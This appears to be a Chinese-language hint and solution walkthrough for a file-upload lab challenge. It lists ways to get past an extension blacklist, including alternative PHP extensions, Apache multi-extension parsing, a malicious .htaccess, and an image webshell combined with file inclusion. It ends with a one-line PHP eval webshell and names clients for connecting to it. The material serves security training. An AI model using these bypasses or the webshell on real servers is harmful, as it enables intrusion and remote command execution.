思路提示

文件上传的核心是服务端只校验了扩展名黑名单，可以绕过。思路分几条路：① 试试黑名单没覆盖的扩展名（如 .pht、.phar、.php7）；② 利用 Apache 多扩展名解析（如 shell.php.jpg）；③ 上传 .htaccess 让 Apache 把 .jpg 当 PHP 执行；④ 配合文件包含关，传内容为 PHP 代码的图片马再包含执行。先看源码确认黑名单具体有哪些扩展名。

详细解题过程（点击展开）
源码逻辑：取最后一个 . 后的扩展名，黑名单：php/php3/php4/php5/phtml
绕过思路：
1. 大小写绕过：shell.PHP、shell.Php（黑名单全是小写比较前的 strtolower 已处理大小写？观察代码！实际上代码做了 strtolower，所以换思路）
2. 特殊扩展名：试试 .pht、.phar、.php7（不在黑名单，取决于 Apache 是否解析）
3. Apache 多扩展名解析：shell.php.jpg（某些 Apache 配置会从右向左识别，遇到不认识的就向左继续，最终按 php 执行）
4. .htaccess：先传 .htaccess（内容 AddType application/x-httpd-php .jpg），再传图片马 shell.jpg
5. 配合文件包含：上传内容为 PHP 代码的 .jpg 图片马，到模块10 文件包含里包含它即可执行
WebShell：<?php @eval($_POST['cmd']);?> 然后用蚁剑/冰蝎连接
